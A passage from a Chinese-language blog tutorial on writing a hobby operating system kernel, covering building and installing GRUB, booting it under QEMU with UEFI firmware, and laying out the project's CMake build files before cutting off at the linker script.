GRUB，首先从 <a href="https://ftp.gnu.org/gnu/grub/">GNU GRUB 的 FTP 服务器</a>进行下载源码，然后在单独的文件夹中进行编译，这里我们三种 GRUB 都编译上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">也可以从这里获取： git <span class="hljs-built_in">clone</span> git://git.savannah.gnu.org/grub.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> grub-2.06/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> EFI32 EFI64 BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> EFI64</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=x86_64 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI32</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=pc --disable-nls &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>注：如果你使用的是 Arch&#x2F;Fedora&#x2F;openSUSE 这样更新比较快的系统，在编译的时候可能会出错（<del>GCC 背大锅</del>），那么这个时候可能就需要使用更新版本的源码，笔者物理机此前使用的是 Fedora Workstation 38，编译 2.06 时爆了莫名其妙的问题，所以后来笔者选择了 <a href="https://git.savannah.gnu.org/cgit/grub.git/tag/?h=grub-2.12-rc1">2.12 rc1</a> 版本的 GRUB2</p></blockquote><p>然后将 GRUB2 安装到 U 盘的 EFI 分区上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt <span class="hljs-comment"># 注意替换成自己的 U 盘对应的设备节点</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI64/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=x86_64-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../EFI32/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=i386-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../BIOS/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --no-floppy --target=i386-pc --boot-directory=/mnt/boot /dev/sdb</span><br></code></pre></td></tr></table></figure><blockquote><p>这里直接用系统自带的 <code>grub-install</code> 也可以直接安装，但是笔者在 Fedora 系统上使用自带的 <code>grub2-install</code> 时出现了这样一个错误：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">grub2-install: <span class="hljs-keyword">error</span>: this utility cannot be used <span class="hljs-keyword">for</span> EFI platforms because <span class="hljs-keyword">it</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> support UEFI Secure Boot.<br></code></pre></td></tr></table></figure><p>网上也没有找到什么比较好的解决方案，笔者只好从源码进行编译</p><blockquote><p>但是 Ubuntu&#x2F;openSUSE 自带的 <code>grub-install/grub2-install</code> 就能正常使用，怎么回事呢</p></blockquote></blockquote><p>接下来我们新建一个文件 <code>/mnt/boot/grub/grub.cfg</code> （假设你的 U 盘 EFI 分区和笔者一样挂载在 <code>/mnt</code> 下），其为 GRUB 的配置文件，编写内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cfg">set timeout=10  # waiting time befo automatic booting<br>set default=0   # default menu entry index<br><br>insmod all_video<br><br>menuentry &quot;Boot ClosureOS v0.0.1&quot; &#123;<br>multiboot2 /boot/kernel.bin # use multiboot2 spec to boot<br>boot<br>&#125;<br><br>if [ $&#123;grub_platform&#125; == &quot;efi&quot; ]; then<br>menuentry &quot;UEFI Setting&quot; &#123;<br>fwsetup<br>&#125;<br>fi<br><br>menuentry &quot;System Reboot&quot; --class=reboot &#123;<br>reboot<br>&#125;<br><br>menuentry &quot;System Shutdown&quot; --class=halt &#123;<br>halt<br>&#125;<br></code></pre></td></tr></table></figure><p>卸载 U 盘，重新启动计算机，进入你的 BIOS&#x2F;UEFI 配置界面，关闭安全启动（<code>Secure Boot</code>），将 U 盘配置为第一个启动项（通常开头会有一个 <code>UEFI: </code> 的标识），重新启动计算机，接下来——</p><p><strong>GNU GRUB，启动！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040634.png"></p><p>当然，现在我们还没有开始编写操作系统内核，所以想要直接启动会报错，不过后面我们编写的内核直接放到 U 盘 EFI 分区的<code>boot/kernel.bin</code> 这个位置就可以直接启动了：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114235156.png"></p><h2 id="创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动"><a href="#创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动" class="headerlink" title="创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动"></a>创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动</h2><p>首先安装一些可能需要的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y qemu qemu-system-x86 ovmf xorriso</span><br></code></pre></td></tr></table></figure><p>然后使用如下脚本在 QEMU 中从 U 盘启动 GRUB，注意替换成你自己的 U 盘设备节点路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sudo qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=/dev/sdb,format=raw,index=0,media=disk<br>-s<br></code></pre></td></tr></table></figure><p>各参数说明如下：</p><ul><li><code>-bios</code> ：指定使用的启动固件，这里是 OVMF，源自于 <a href="https://github.com/tianocore/edk2">EDK2</a> 的 UEFI 固件</li><li><code>-cpu</code>：指定 CPU 类型及特性，<code>kvm64</code> 是一种常规的 CPU 类型，<code>+smep</code> 和 <code>+smap</code> 表示开启阻止内核空间执行&#x2F;访问用户空间数据的保护</li><li><code>-smp</code>：指定 CPU 插槽数、单个插槽上 DIE 的数量、每个 DIE 的核心数、每个核心的线程数</li><li><code>-m</code>：内存大小</li><li><code>--machine</code> ：机器设备类型，QEMU 支持两种设备，另外一种是比较老的 <code>i440fx</code></li><li><code>-drive</code>：添加一个设备，这里添加了 <code>/dev/sdc</code> 设备</li><li><code>-s</code>：支持通过使用 gdb 连接 <code>0.0.0.0:1234</code> 进行调试</li></ul><p>简单测试一下，成功进入 GRUB 界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040935.png"></p><blockquote><p>如果未指定 <code>-bios</code> 参数，则默认会使用 SeaBIOS 进行启动，此时便是传统的 BIOS + MBR 启动方式：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041009.png"></p></blockquote><p>不过可能也有同学手上暂时没有闲置的 U 盘或其他外部存储设备，此时我们也可以使用 <code>grub-mkrescue</code> 创建一个专门用来调试的镜像，首先创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree target/</span><br>target/<br>└── x86_64<br>    └── iso<br>        └── boot<br>            └── grub<br>                └── grub.cfg<br><br>4 directories, 1 file<br></code></pre></td></tr></table></figure><p>接下来使用  <code>grub-mkrescue</code> 创建镜像：</p><blockquote><p>在部分发行版上，这可能叫 <code>grub2-mkrescue</code> ，固件路径也可能不一样，请自行分辨</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkrescue /usr/lib/grub/x86_64-efi -o kernel.iso target/x86_64/iso</span><br></code></pre></td></tr></table></figure><p>把启动脚本中的设备节点路径改成文件路径即可成功启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=./kernel.iso,format=raw,index=0,media=disk<br></code></pre></td></tr></table></figure><h1 id="0x03-启动一个空白内核"><a href="#0x03-启动一个空白内核" class="headerlink" title="0x03. 启动一个空白内核"></a>0x03. 启动一个空白内核</h1><p>接下来我们终于要正式开始进行内核的编写了，过去绝大部分的操作系统内核都是用 <code>汇编 + C 语言</code> 编写的，不过最近也有使用 Rust 替换 C 语言的内核实现（例如国产操作系统 <a href="https://dragonos.org/">DragonOS</a> ，<strong>与绝大多数 Linux 系统调用兼容，目前已经完成了 musl-gcc 的移植</strong>，笔者觉得非常🐂🍺），Rust 也在逐渐进入 Linux 内核，包括<a href="https://os.educg.net/#/">计算机系统能力大赛</a> 主推的也是 Rust 内核</p><p>但是对于新手而言 Rust 终归是有些难以让人绷得住，在笔者看来<strong>不能像 C 语言那样提供足够贴近于硬件底层的直接抽象</strong>，因此笔者这里还是先选择自己最喜欢的 C 语言编写内核最核心部分的代码，不过后面我们也可能引入一部分 C++ 代码 ：）</p><blockquote><p>算下来已经是笔者写的第四个内核了，希望这次能够达到比较高的一个完成度</p></blockquote><h2 id="代码基本结构"><a href="#代码基本结构" class="headerlink" title="代码基本结构"></a>代码基本结构</h2><p>最初的代码结构如下所示，包含一个空白内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── LICENSE<br>├── README.md<br>├── src<br>│   ├── arch<br>│   │   ├── CMakeLists.txt<br>│   │   └── x86<br>│   │       ├── boot<br>│   │       │   ├── boot_font.o<br>│   │       │   ├── boot_main.c<br>│   │       │   ├── boot.S<br>│   │       │   ├── boot_tty.c<br>│   │       │   └── CMakeLists.txt<br>│   │       ├── CMakeLists.txt<br>│   │       ├── include<br>│   │       │   └── asm<br>│   │       │       ├── com.h<br>│   │       │       ├── cpu_types.h<br>│   │       │       ├── io.h<br>│   │       │       └── page_types.h<br>│   │       └── linker.lds<br>│   ├── CMakeLists.txt<br>│   ├── include<br>│   │   ├── boot<br>│   │   │   └── multiboot2.h<br>│   │   ├── closureos<br>│   │   │   └── types.h<br>│   │   └── graphics<br>│   │       └── tty<br>│   │           ├── default.h<br>│   │           └── font<br>│   │               └── psf.h<br>│   └── kernel<br>│       ├── CMakeLists.txt<br>│       └── main.c<br>├── targets<br>│   └── x86_64<br>│       └── iso<br>│           └── boot<br>│               └── grub<br>│                   └── grub.cfg<br>└── tools<br>    └── scripts<br>        ├── boot.sh<br>        └── repack_iso.sh<br><br>21 directories, 24 files<br></code></pre></td></tr></table></figure><p>我们使用 <code>CMake</code> 来进行项目管理，相比起传统的 <code>Makefile</code> ，这是一种更加方便、更加自动化、更加规范的现代编译工具</p><blockquote><p>什么，你不知道如何编写 CMake？还不<a href="https://cmake.org/cmake/help/latest/index.html">赶快学！</a></p></blockquote><p>根目录的 <code>CMakeLists.txt</code> 编写如下，主要作用就是准备统一的编译参数、进入不同文件夹进行 make、链接所有的目标文件，这里我们去掉了标准库支持、去掉了调试段、指定了静态编译……因为在裸金属环境下能依赖的只有我们自己：）</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.16</span>)<br><span class="hljs-keyword">project</span>(ClosureOS)<br><br><span class="hljs-comment"># for debugging only</span><br><span class="hljs-comment">#set(CMAKE_VERBOSE_MAKEFILE ON)</span><br><br><span class="hljs-comment"># languages we will use</span><br><span class="hljs-keyword">enable_language</span>(C)<br><span class="hljs-keyword">enable_language</span>(ASM)<br><br><span class="hljs-comment"># check for current compiler environment, temporarily support linux only</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">NOT</span> CMAKE_HOST_SYSTEM_NAME <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;Linux&quot;</span>)<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Unsatisfied compilation environment, only support Linux now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># global link script</span><br><span class="hljs-keyword">if</span> (CMAKE_HOST_SYSTEM_PROCESSOR <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;x86_64&quot;</span>)<br>    <span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; -T $&#123;CMAKE_SOURCE_DIR&#125;/arch/x86/linker.lds&quot;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Only support x86_64 now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># compile and link as bare bone project</span><br><span class="hljs-keyword">add_compile_options</span>(-pipe -ffreestanding -nostdlib -fno-pie -fno-stack-protector -mcmodel=large -fno-asynchronous-unwind-tables)<br><span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; -nostdlib -z max-page-size=0x1000 -Wl,--build-id=none -static&quot;</span>)<br><br><span class="hljs-comment"># general include dirs</span><br><span class="hljs-keyword">include_directories</span>(<span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/<span class="hljs-keyword">include</span>)<br><br><span class="hljs-comment"># seperate module</span><br><span class="hljs-keyword">add_subdirectory</span>(arch)<br><span class="hljs-keyword">add_subdirectory</span>(kernel)<br><br><span class="hljs-comment"># we create an empty file for add_executable(), as it must need at least one file to work</span><br><span class="hljs-keyword">file</span>(WRITE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/internal_empty_file_for_occupation_only.cpp&quot;</span> <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">add_executable</span>(kernel.bin <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/internal_empty_file_for_occupation_only.cpp&quot;</span>)<br><br><span class="hljs-comment"># final output</span><br><span class="hljs-keyword">target_link_libraries</span>(kernel.bin<br>    PRIVATE<br>        Arch<br>        Kernel<br>)<br><br></code></pre></td></tr></table></figure><p><code>include</code> 目录下是用于各个子系统的各种头文件，与 multiboot2 规范相关的一些定义放在 <code>include/boot/multiboot2.h</code> 中，该头文件来自于<a href="https://www.gnu.org/software/grub/manual/multiboot2/html_node/multiboot2_002eh.html">Multiboot 2 spec</a>，比较长，这里就不贴出来了</p><p>内核主体放在 <code>kernel</code> 目录下，其中 <code>kernel/CMakeLists.txt</code> 编写如下，目前暂时就只是添加当前文件夹下文件链接为 <code>Kernel</code> ：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Kernel)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.cpp&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">target_sources</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>kernel/main.c</code> 暂时就先放一个空的函数， <em>本篇博客暂时还用不到这块</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>arch</code> 目录下是与架构相关的代码，目前暂时还是只支持 x86，不过后续如果有机会的话笔者希望能够让他在更多架构上跑起来，所以这里设计了一个通用的 <code>CMakeLists.txt</code>：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Arch)<br><br><span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br><br><span class="hljs-comment"># check for current architecture</span><br><span class="hljs-keyword">if</span> (CMAKE_HOST_SYSTEM_PROCESSOR <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;x86_64&quot;</span>)<br>    <span class="hljs-keyword">add_subdirectory</span>(x86)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span><br>        INTERFACE<br>            X86)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Only support x86_64 now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>arch/x86/CMakeLists.txt</code> 主要就是编译汇编和 C 文件以及启动阶段临时用的字体文件放到 <code>out/arch</code> 目录下，这里我们将启动阶段所需的代码都放在 <code>arch/x86/boot</code> 目录下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME X86)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">include_directories</span>(<span class="hljs-keyword">include</span>)<br><br><span class="hljs-keyword">add_subdirectory</span>(boot)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.cpp&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">target_sources</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC Boot)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE Boot)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>arch/x86/boot/CMakeLists.txt</code> 则就只是简单地编译当前目录的代码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Boot)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.S&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/boot_font.o&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;no source files provided for boot&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><h2 id="linker-lds：链接脚本"><a href="#linker-lds：链接脚本" class="headerlink" title="linker.lds：链接脚本"></a>linker.lds：链接脚本</h2><blockquote><p>什么，你不知道什么事链接脚本？还不<a href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_chapter/ld_3.html">赶快学</a>！</p></blockquote><p>链接脚本用来指示我们的内核可执行文件各个段的布局，例如不同的段的加载地址，在操作系统开发中有个不成文的约定就是将内核加载到物理内存 1M 起始，因此我们需要在链接脚本中将我们的引导部分放到这个位置，同时作为一个不成文的规范，<strong>内核应当被装载到高地址处</strong>，那么我们的内核应当分为如下两大部分：</p><ul><li>boot：由 GRUB 引导，负责进行页表重映射、内存管理初始化等预备工作，完成后跳转至内核</li><li>kernel：实际的内核主体，位于虚拟地址的高地址处</li></ul><p>笔者选择将 boot 阶段的所有代码全都放在开头为 <code>.boot</code> 的段当中，将 kernel 的 <code>.text</code> 等段重新从高地址处计算起始地址，因此链接脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 